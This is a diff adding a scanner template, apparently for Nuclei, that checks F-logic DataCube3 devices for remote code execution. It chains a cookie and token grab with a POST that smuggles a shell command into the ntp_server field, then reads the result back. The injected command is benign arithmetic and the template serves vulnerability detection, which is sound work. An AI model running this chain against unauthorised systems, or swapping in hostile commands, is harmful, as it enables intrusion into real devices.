@@ -1,0 +1,65 @@
+id: poc-yaml-f-logic-datacube3-rce
+info:
+  name: F-logic DataCube3 RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,datacube3
+  description: |
+    F-logic DataCube3 measurement system remote code execution (RCE) vulnerability.
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(6))}}"
+  t1: "{{rand_int(100000, 999000)}}"
+  t2: "{{rand_int(100, 1000)}}"
+  t3: "{{to_number(t1) - to_number(t2)}}"
+http:
+  - id: initial-access
+    method: GET
+    path:
+      - "{{BaseURL}}/admin/setting_photo.php"
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        regex:
+          - "SESS_IDS=([a-zA-Z0-9]+);"
+        internal: true
+      - type: regex
+        name: accesstime
+        part: body
+        regex:
+          - "name=\"accesstime\" value=\"(.*?)\""
+        internal: true
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - "accesstime"
+        part: body
+  - id: execute-command
+    method: POST
+    path:
+      - "{{BaseURL}}/admin/config_time_sync.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "SESS_IDS={{cookie}}"
+    body: "accesstime={{accesstime}}&execute=&ntp_enable=&ntp_server=127.0.0.1|expr {{t1}} - {{t2}} > {{filename}}.txt|&ntp_retry_count=1"
+    matchers:
+      - type: status
+        status:
+          - 302
+  - id: verify-execution
+    method: GET
+    path:
+      - "{{BaseURL}}/admin/{{filename}}.txt"
+    headers:
+      Cookie: "SESS_IDS={{cookie}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "trim(body) == t3"
